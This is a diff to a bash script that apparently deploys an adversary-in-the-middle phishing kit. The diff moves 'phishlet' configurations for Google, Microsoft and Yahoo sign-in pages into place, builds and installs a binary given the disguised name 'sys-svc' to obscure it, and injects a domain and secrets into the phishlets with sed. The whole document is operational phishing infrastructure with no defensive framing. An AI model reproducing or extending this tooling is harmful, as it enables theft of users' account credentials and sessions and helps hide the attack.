@@ -98,14 +98,14 @@ parse_args() {
 phase_check_files() {
     log "Checking local resource files..."
     
-    if [[ ! -f "$SCRIPT_DIR/resources/google.yaml" ]]; then
-        error "resources/google.yaml not found"
+    if [[ ! -f "$SCRIPT_DIR/phishlets/google.yaml" ]]; then
+        error "phishlets/google.yaml not found"
     fi
-    if [[ ! -f "$SCRIPT_DIR/resources/microsoft.yaml" ]]; then
-        error "resources/microsoft.yaml not found"
+    if [[ ! -f "$SCRIPT_DIR/phishlets/microsoft.yaml" ]]; then
+        error "phishlets/microsoft.yaml not found"
     fi
-    if [[ ! -f "$SCRIPT_DIR/resources/yahoo.yaml" ]]; then
-        error "resources/yahoo.yaml not found"
+    if [[ ! -f "$SCRIPT_DIR/phishlets/yahoo.yaml" ]]; then
+        error "phishlets/yahoo.yaml not found"
     fi
     
     success "Resource files verified (edit these before deployment if needed)"
@@ -248,6 +248,10 @@ phase_build() {
     # Obfuscate the binary name during build
     go build -buildvcs=false -o sys-svc 
     
+    if [[ ! -f "sys-svc" ]]; then
+        error "Build failed - sys-svc binary not found in $(pwd)"
+    fi
+
     mkdir -p "$APP_DIR"/{config,resources,certs,storage,logs,notifications}
     cp sys-svc /usr/local/bin/sys-svc
     chmod +x /usr/local/bin/sys-svc
@@ -271,9 +275,9 @@ phase_deploy_resources() {
     echo "$EP3" > "$APP_DIR/.ep3"
     
     # Copy from local editable resources
-    cp "$SCRIPT_DIR/resources/google.yaml" "$APP_DIR/resources/"
-    cp "$SCRIPT_DIR/resources/microsoft.yaml" "$APP_DIR/resources/"
-    cp "$SCRIPT_DIR/resources/yahoo.yaml" "$APP_DIR/resources/"
+    cp "$SCRIPT_DIR/phishlets/google.yaml" "$APP_DIR/resources/"
+    cp "$SCRIPT_DIR/phishlets/microsoft.yaml" "$APP_DIR/resources/"
+    cp "$SCRIPT_DIR/phishlets/yahoo.yaml" "$APP_DIR/resources/"
     
     # Enhanced sed to match .EndpointX naming and inject secrets
     sed -i "s/{{.Domain}}/$DOMAIN/g" "$APP_DIR/resources/"*.yaml
